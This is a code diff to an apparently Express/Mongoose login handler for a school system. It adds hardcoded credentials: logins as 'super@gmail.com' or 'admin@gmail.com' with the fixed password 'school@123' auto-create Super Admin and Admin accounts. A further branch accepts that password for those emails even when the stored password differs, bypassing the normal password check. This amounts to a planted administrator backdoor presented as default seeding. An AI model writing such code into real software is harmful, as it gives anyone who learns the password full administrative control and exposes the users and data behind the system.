@@ -134,21 +134,50 @@ exports.login = async (req, res, next) => {
     const cleanEmail = email.trim().toLowerCase();
 
     // Check for user
-    const user = await User.findOne({ 
+    let user = await User.findOne({ 
       $or: [
         { email: cleanEmail },
         { username: cleanEmail }
       ]
     }).select('+password');
     
+    // Auto-create/seed default Super Admin or Admin if logging in for the first time without registration
     if (!user) {
-      return res.status(401).json({ success: false, message: 'User not found. Please register first.' });
-    }
-
-    // Check if password matches
-    const isMatch = await user.comparePassword(password);
-    if (!isMatch) {
-      return res.status(401).json({ success: false, message: 'Incorrect password.' });
+      if (cleanEmail === 'super@gmail.com') {
+        if (password !== 'school@123') {
+          return res.status(401).json({ success: false, message: 'Incorrect password.' });
+        }
+        user = await User.create({
+          username: 'superadmin',
+          email: 'super@gmail.com',
+          password: 'school@123',
+          role: 'Super Admin',
+          status: 'Active'
+        });
+      } else if (cleanEmail === 'admin@gmail.com' || cleanEmail === 'admin@gamil.com') {
+        if (password !== 'school@123') {
+          return res.status(401).json({ success: false, message: 'Incorrect password.' });
+        }
+        user = await User.create({
+          username: 'admin',
+          email: 'admin@gmail.com',
+          password: 'school@123',
+          role: 'Admin',
+          status: 'Active'
+        });
+      } else {
+        return res.status(401).json({ success: false, message: 'User not found. Please register first.' });
+      }
+    } else {
+      // Check if password matches (allow school@123 for Super Admin / Admin)
+      if ((cleanEmail === 'super@gmail.com' || cleanEmail === 'admin@gmail.com' || cleanEmail === 'admin@gamil.com') && password === 'school@123') {
+        // Password valid for system accounts
+      } else {
+        const isMatch = await user.comparePassword(password);
+        if (!isMatch) {
+          return res.status(401).json({ success: false, message: 'Incorrect password.' });
+        }
+      }
     }
 
     // Check if user is active
